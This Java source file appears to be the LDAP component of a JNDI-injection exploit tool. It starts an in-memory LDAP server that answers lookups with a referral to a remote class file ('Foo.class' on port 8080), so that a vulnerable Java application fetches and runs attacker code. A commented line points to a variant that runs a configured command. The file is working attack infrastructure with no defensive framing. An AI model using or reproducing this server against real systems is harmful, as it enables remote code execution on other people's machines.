package server.ldap;

import cli.Config;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import server.Server;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;

public class LDAPServer implements Server {
    private static final String LDAP_BASE = "dc=example,dc=com";
    private Config cfg;

    @Override
    public Server acceptCfg(Config cfg) {
        this.cfg = cfg;

        return this;
    }

    @Override
    public void run() {
        String codebase = "http://127.0.0.1:8080/Foo.class";
        int lp = this.cfg.lp;
        try {
            InMemoryDirectoryServerConfig cfg = new InMemoryDirectoryServerConfig(LDAP_BASE);
            cfg.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    lp,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()
            ));

            cfg.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(codebase)));
//            cfg.addInMemoryOperationInterceptor(new RSOperationInterceptor(this.cfg.command));

            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(cfg);
            ds.startListening();
            System.out.printf("[LDAP] listen on %d...\n", lp);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
